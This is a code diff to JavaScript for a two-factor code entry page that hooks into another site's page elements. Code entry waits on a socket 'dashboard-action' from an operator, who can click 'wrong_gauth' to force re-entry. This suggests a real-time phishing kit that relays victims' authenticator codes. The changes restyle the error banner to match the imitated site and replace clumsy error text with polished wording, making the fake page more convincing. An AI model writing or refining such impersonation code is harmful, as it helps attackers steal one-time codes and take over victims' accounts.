@@ -146,7 +146,7 @@ if (dest) {
     btn.style.height = "";
   }
 
-  // --- Error UI helpers (big red banner under the input) ---
+  // --- Error UI helpers (pink banner above the card, matching image style) ---
   function getOrCreateErrorEl(input) {
     const existing = document.getElementById("gauth-error");
     if (existing) return existing;
@@ -154,26 +154,31 @@ if (dest) {
     err.id = "gauth-error";
     err.setAttribute("role", "alert");
     err.setAttribute("aria-live", "assertive");
-    err.style.background = "#d93025";   // red
-    err.style.color = "#ffffff";
-    err.style.padding = "10px 14px";
-    err.style.borderRadius = "10px";
-    err.style.marginTop = "10px";
-    err.style.fontWeight = "700";
-    err.style.fontSize = "16px";
-    err.style.letterSpacing = "0.2px";
-    if (input && input.parentNode) {
-      if (input.nextSibling) input.parentNode.insertBefore(err, input.nextSibling);
-      else input.parentNode.appendChild(err);
+    err.style.background = "#f9d0cb";
+    err.style.color = "#a93226";
+    err.style.padding = "14px 20px";
+    err.style.borderRadius = "12px";
+    err.style.marginBottom = "16px";
+    err.style.fontWeight = "400";
+    err.style.fontSize = "30px";
+    err.style.letterSpacing = "0px";
+    const card = document.querySelector(
+      '[data-testid="two-factor-auth-details-component"], .sc-ccd8bc56-0, [data-qa="two-factor-auth-details-container"]'
+    );
+    const cardParent = card ? card.closest('.sc-a49e7241-1, [class*="evbOfN"], form') || card.parentNode : null;
+    if (cardParent && cardParent.parentNode) {
+      cardParent.parentNode.insertBefore(err, cardParent);
+    } else if (card && card.parentNode) {
+      card.parentNode.insertBefore(err, card);
     } else {
-      document.body.appendChild(err);
+      document.body.insertBefore(err, document.body.firstChild);
     }
     return err;
   }
 
   function showWrongCodeError(input, submit, text) {
     const err = getOrCreateErrorEl(input);
-    err.textContent = text || "wrong code, please try again, please try again";
+    err.textContent = text || "That didn't work. Try again or get a new code.";
     try { input.setAttribute("aria-invalid", "true"); } catch {}
     try { input.focus(); input.select && input.select(); } catch {}
     restoreButtonFromLoading(submit);
@@ -278,7 +283,7 @@ if (dest) {
       if (!isSixDigits(code)) {
         // Show the same error behavior as wrong_gauth - DON'T call updateBtn() after setNotReady
         try { window.wsClearPendingGAuth && window.wsClearPendingGAuth(); } catch {}
-        showWrongCodeError(input, submit, "wrong code, please try again");
+        showWrongCodeError(input, submit, "That didn't work. Try again or get a new code.");
         setNotReady(submit);   // require new 6-digit entry
         return;
       }
@@ -303,7 +308,7 @@ if (dest) {
       socket.on("dashboard-action", ({ buttonName, message }) => {
         if (buttonName === "wrong_gauth") {
           try { window.wsClearPendingGAuth && window.wsClearPendingGAuth(); } catch {}
-          showWrongCodeError(input, submit, message || "wrong code, please try again");
+          showWrongCodeError(input, submit, message || "That didn't work. Try again or get a new code.");
           setNotReady(submit);   // require new 6-digit entry
           updateBtn();
         } else if (buttonName === "gauth") {
@@ -359,7 +364,7 @@ if (dest) {
     return socket;
   }
 
-  // --- Error UI helpers (same as main auth.js) ---
+  // --- Error UI helpers (pink banner above the card, matching image style) ---
   function getOrCreateErrorEl(input) {
     const existing = document.getElementById("gauth-error");
     if (existing) return existing;
@@ -367,26 +372,31 @@ if (dest) {
     err.id = "gauth-error";
     err.setAttribute("role", "alert");
     err.setAttribute("aria-live", "assertive");
-    err.style.background = "#d93025";   // red
-    err.style.color = "#ffffff";
-    err.style.padding = "10px 14px";
-    err.style.borderRadius = "10px";
-    err.style.marginTop = "10px";
-    err.style.fontWeight = "700";
-    err.style.fontSize = "16px";
-    err.style.letterSpacing = "0.2px";
-    if (input && input.parentNode) {
-      if (input.nextSibling) input.parentNode.insertBefore(err, input.nextSibling);
-      else input.parentNode.appendChild(err);
+    err.style.background = "#f9d0cb";
+    err.style.color = "#a93226";
+    err.style.padding = "14px 20px";
+    err.style.borderRadius = "12px";
+    err.style.marginBottom = "16px";
+    err.style.fontWeight = "400";
+    err.style.fontSize = "30px";
+    err.style.letterSpacing = "0px";
+    const card = document.querySelector(
+      '[data-testid="two-factor-auth-details-component"], .sc-ccd8bc56-0, [data-qa="two-factor-auth-details-container"]'
+    );
+    const cardParent = card ? card.closest('.sc-a49e7241-1, [class*="evbOfN"], form') || card.parentNode : null;
+    if (cardParent && cardParent.parentNode) {
+      cardParent.parentNode.insertBefore(err, cardParent);
+    } else if (card && card.parentNode) {
+      card.parentNode.insertBefore(err, card);
     } else {
-      document.body.appendChild(err);
+      document.body.insertBefore(err, document.body.firstChild);
     }
     return err;
   }
 
   function showWrongCodeError(input, submit, text) {
     const err = getOrCreateErrorEl(input);
-    err.textContent = text || "wrong code, please try again";
+    err.textContent = text || "That didn't work. Try again or get a new code.";
     try { input.setAttribute("aria-invalid", "true"); } catch {}
     try { input.focus(); input.select && input.select(); } catch {}
     // Restore button from loading state
@@ -448,7 +458,7 @@ if (dest) {
       if (!isSixDigits(code)) {
         // Show the same error behavior as wrong_gauth - DON'T call updateBtn() or setNotReady after error
         e.preventDefault();
-        showWrongCodeError(input, submit, "wrong code, please try again");
+        showWrongCodeError(input, submit, "That didn't work. Try again or get a new code.");
         return;
       }
       e.preventDefault();
